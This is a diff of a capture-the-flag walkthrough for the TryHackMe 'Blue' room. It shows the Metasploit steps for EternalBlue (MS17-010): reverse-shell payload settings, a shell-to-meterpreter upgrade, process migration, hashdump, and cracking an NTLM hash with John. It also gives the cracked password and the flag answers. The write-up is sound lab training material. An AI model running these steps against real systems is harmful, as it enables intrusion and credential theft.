@@ -120,7 +120,7 @@ Searching Metasploit for "MS17-010" will show the relevant modules we could use 
 ```
 search MS17-010
 ```
-![image](https://user-images.githubusercontent.com/14150485/170931184-aeec3b61-685c-4c8c-b059-6000b0ffc6a5.png)
+![image](https://user-images.githubusercontent.com/14150485/171114110-e0c005f4-9378-4351-a843-6a417c0e65b6.png)
 
 EternalBlue is a well-known SMB exploit which we have also used in other rooms:
 ```
@@ -146,11 +146,16 @@ Running the "show options" command shows us which values we need to set before w
 show options
 ```
 
-![image](https://user-images.githubusercontent.com/14150485/170932504-69f81f87-cb75-4051-9815-ed120e88e63d.png)
+![image](https://user-images.githubusercontent.com/14150485/171114398-fb79879d-4e2c-4708-9224-6803bea79456.png)
 
 ```
 set RHOSTS REMOTE_IP
 ```
+Although this is not mentioned on the task, seeing as the exploit can successfully run without this setting, I found that updating the LHOST value with the local IP resolved some issues executing the exploit successfully.
+```
+set LHOST LOCAL_IP
+```
+
 The answer is:
 ```
 RHOSTS
@@ -166,7 +171,9 @@ RHOSTS
 
 <br />
 
-As mentioned in the task description this step is optional, however learning something new is always a good idea!
+As mentioned in the task description this step is optional, however anything that benefits us in our learning process is always welcome! 
+<br />
+Having said that, my personal experience using this payload with Blue was problematic due to multiple sessions that interfered both with my console, as well as my overall bandwidth.
 ```
 set payload windows/x64/shell/reverse_tcp
 ```
@@ -184,7 +191,7 @@ No answer needed
 
 And we're in!
 
-![image](https://user-images.githubusercontent.com/14150485/170935109-606cc4c8-8f74-4c7b-b877-1af20ef8a9bf.png)
+![image](https://user-images.githubusercontent.com/14150485/171119152-d06c8d10-5932-483b-9dde-5b8150205f7b.png)
 
 ```
 No answer needed
@@ -214,7 +221,7 @@ search shell_to_meterpreter
 ```
 The only result coming up is "post/multi/manage/shell_to_meterpreter".
 
-![image](https://user-images.githubusercontent.com/14150485/170936056-c4af50e2-a5a9-45be-a2c8-0e428a783165.png)
+![image](https://user-images.githubusercontent.com/14150485/171119350-819f41db-0d4b-40fc-8165-3cc20900b5af.png)
 
 ```
 post/multi/manage/shell_to_meterpreter
@@ -228,7 +235,7 @@ post/multi/manage/shell_to_meterpreter
 
 Listing the options for this module, we will be required to update the "SESSION" attribute with our active session ID.
 
-![image](https://user-images.githubusercontent.com/14150485/170936412-866b08d9-ade7-4d1f-89d9-8f0f05aa6044.png)
+![image](https://user-images.githubusercontent.com/14150485/171119843-5c4500bc-8dc8-4489-b6e1-c2b6ed15dfd2.png)
 
 The answer is:
 ```
@@ -245,7 +252,7 @@ We can view our active session ID using the "sessions" command.
 ```
 sessions
 ```
-![image](https://user-images.githubusercontent.com/14150485/170936885-e6cdaba0-7814-4f9f-8031-c822284cfc1a.png)
+![image](https://user-images.githubusercontent.com/14150485/171120026-1779fb73-d2ae-4066-8487-fa8f5e69403d.png)
 
 We can now proceed to update the value:
 ```
@@ -265,7 +272,7 @@ No answer needed
 
 Running the exploit should inform us that the module was successfully executed.
 
-![image](https://user-images.githubusercontent.com/14150485/170937967-4df7d691-5e88-4531-b2af-c8b784afdc25.png)
+![image](https://user-images.githubusercontent.com/14150485/171120275-7833ac39-45d4-423c-a0e8-a788b87beeb3.png)
 
 ```
 No answer needed
@@ -281,7 +288,7 @@ We can switch sessions using the following command:
 ```
 sessions -i SESSION_ID
 ```
-![image](https://user-images.githubusercontent.com/14150485/170939666-6af9a594-23be-457a-97a0-1bf67a2ee72c.png)
+![image](https://user-images.githubusercontent.com/14150485/171121031-bdf3888f-7bdd-43ca-9ccb-fcc271344a14.png)
 
 ```
 No answer needed
@@ -295,7 +302,7 @@ No answer needed
 
 As instructed, using the "shell" and "whoami" commands will show us the current privileges on the target system.
 
-![image](https://user-images.githubusercontent.com/14150485/170939937-37bc0838-71ad-484d-b583-9f750bdc6b92.png)
+![image](https://user-images.githubusercontent.com/14150485/171121162-aef02aea-2cf5-4878-9171-75042643ab5d.png)
 
 ```
 No answer needed
@@ -315,7 +322,7 @@ We can now run the "ps" command to list the active processes.
 ```
 ps
 ```
-![image](https://user-images.githubusercontent.com/14150485/170947023-3f79b27f-5e3d-484b-ac35-2682a66a6f4a.png)
+![image](https://user-images.githubusercontent.com/14150485/171121665-fb781d18-eee0-472d-a18b-fa4480b4ba4a.png)
 
 ```
 No answer needed
@@ -331,7 +338,7 @@ We might need to try multiple processes for this until we can successfully migra
 ```
 migrate PID
 ```
-![image](https://user-images.githubusercontent.com/14150485/170947190-405b831f-0220-4ecf-baf2-097dd9c8e46a.png)
+![image](https://user-images.githubusercontent.com/14150485/171121728-f81e6336-fda7-461d-8220-9eb654018fc1.png)
 
 ```
 No answer needed
@@ -351,7 +358,7 @@ This one is simple, we just need to run the "hashdump" commmand to get the hashe
 hashdump
 ```
 
-![image](https://user-images.githubusercontent.com/14150485/170947857-bd9ec4e3-2084-41b0-9a9f-90541bb5d870.png)
+![image](https://user-images.githubusercontent.com/14150485/171121841-0dc9057d-0cf3-4674-b44f-5ca8ca6a9597.png)
 
 There are 3 users, 1 of which appears to be non-default.
 ```
@@ -366,14 +373,14 @@ Jon
 
 Since this is a Windows machine, we can expect to see NT hashes (also known as NTLM). We can confirm this by running the hash against a hash identifier. My personal favorite is https://hashes.com/en/tools/hash_identifier.
 
-![image](https://user-images.githubusercontent.com/14150485/170950699-7aedfbef-129d-4232-8ff4-a6f5ae7fd715.png)
+![image](https://user-images.githubusercontent.com/14150485/171122044-a5e98fc1-2737-49b4-9c53-e8ea2baccab2.png)
 
 Now that we have confirmed this to be an NTLM hash we can easily proceed to crack it using John The Ripper. To do so, create a file at a location of your choice and paste the hash into it. Then let John do what he does best!
 ```
 john --format=NT --wordlist=/PATH/rockyou.txt HASH_FILE
 ```
 
-![image](https://user-images.githubusercontent.com/14150485/170951262-ecea0adc-561b-46e9-a305-aa518cb7361d.png)
+![image](https://user-images.githubusercontent.com/14150485/171124371-d9b98ba2-8f8a-413c-95d2-e7f8239d1b1d.png)
 
 ```
 alqfna22
@@ -390,14 +397,14 @@ alqfna22
 
 Easy one - The top folder on Windows systems is "C:\\", as also subtly hinted on the question.
 
-![image](https://user-images.githubusercontent.com/14150485/170952503-4048ea2c-61b8-4da7-b13b-ce77f8a05085.png)
+![image](https://user-images.githubusercontent.com/14150485/171124609-030be4c9-1e72-44db-93a8-f1bfe75e6a9a.png)
 
 Here it is - "flag1.txt" is indeed located in this folder. Now for the file contents.
 ```
 cat flag1.txt
 ```
 
-![image](https://user-images.githubusercontent.com/14150485/170952910-3375a111-c33b-4178-8981-47f78e8fab64.png)
+![image](https://user-images.githubusercontent.com/14150485/171124905-8eaac059-c5a6-4ea3-bd6b-30ffb6e4d38d.png)
 
 The flag is:
 ```
@@ -418,14 +425,14 @@ cd Windows\\System32\\config\\
 ls
 ```
 
-![image](https://user-images.githubusercontent.com/14150485/170956190-4010902b-c47d-4c1d-97de-4e03b8b906ba.png)
+![image](https://user-images.githubusercontent.com/14150485/171125148-2b4d2599-edbf-4fbd-b716-6b6f42ac63cf.png)
 
 Viewing the contents of the file reveals the flag string we are looking for.
 ```
 cat flag2.txt
 ```
 
-![image](https://user-images.githubusercontent.com/14150485/170956292-c159026f-22e7-4157-a6bd-247b81dff24d.png)
+![image](https://user-images.githubusercontent.com/14150485/171125234-a9a7e9d6-2d94-4478-a75d-654d9d33d040.png)
 
 ```
 flag{sam_database_elevated_access}
@@ -441,15 +448,17 @@ There are multiple ways of varying complexity that we can employ to approach thi
 
 The question is hinting us at "Administrators" and *things* they save. As we saw in task [4.1](https://github.com/EvanDiamantidis/TryHackMe/tree/main/Blue#41-within-our-elevated-meterpreter-shell-run-the-command-hashdump-this-will-dump-all-of-the-passwords-on-the-machine-as-long-as-we-have-the-correct-privileges-to-do-so-what-is-the-name-of-the-non-default-user), there are 3 accounts on this machine - Administrator, Guest and Jon. Navigating to the "C:\Users\\" folder, however, we only see a "Jon" folder along with the default ones, such as "All Users", "Default", "Public", etc.
 
-![image](https://user-images.githubusercontent.com/14150485/170963756-4b26ea7f-8b4f-489f-9614-838230530b07.png)
+![image](https://user-images.githubusercontent.com/14150485/171125416-fbbd89cf-6b4f-48a9-8c19-c46b8f5c9148.png)
 
 Interesting, as this means we are most likely to find something in there! 
 <br />
 *Administrators usually have pretty interesting things saved*, and it just so happens that we are looking for a flag which, more often than not, is a string saved in a text file. This should prompt us to have a look under the "Documents" folder and see if we can find anything useful.
 
-![image](https://user-images.githubusercontent.com/14150485/170968141-00d71b0d-707f-43cc-9083-e90075c4dc56.png)
+![image](https://user-images.githubusercontent.com/14150485/171125576-e3ca2133-0861-41cd-a6c9-69b77ade528a.png)
 
 The "flag3.txt" file is in here, indeed!
+
+![image](https://user-images.githubusercontent.com/14150485/171125747-04106d65-0700-4dc5-a901-eaec3f419f78.png)
 
 ```
 flag{admin_documents_can_be_valuable}
@@ -468,7 +477,7 @@ There is a way we can actually get all the flag file paths using a single comman
 search -f *flag*.txt
 ```
 
-![image](https://user-images.githubusercontent.com/14150485/170983401-d5d4f3a9-9516-4401-b5d2-9b4c063077bc.png)
+![image](https://user-images.githubusercontent.com/14150485/171125961-d611bd70-b843-4d0c-a700-6962bf850de1.png)
 
 Although this is the most efficient solution to the challenge, it might be counter-productive to the process, seeing as we should aim to conduct our own research based on the hints provided for each flag as part of our learning process around the use of Metasploit, Meterpreter, shell and session switching, as well as Windows filesystems in general. That said, knowing how and when to take advantage of Meterpreter commands is excellent knowledge in itself.
 
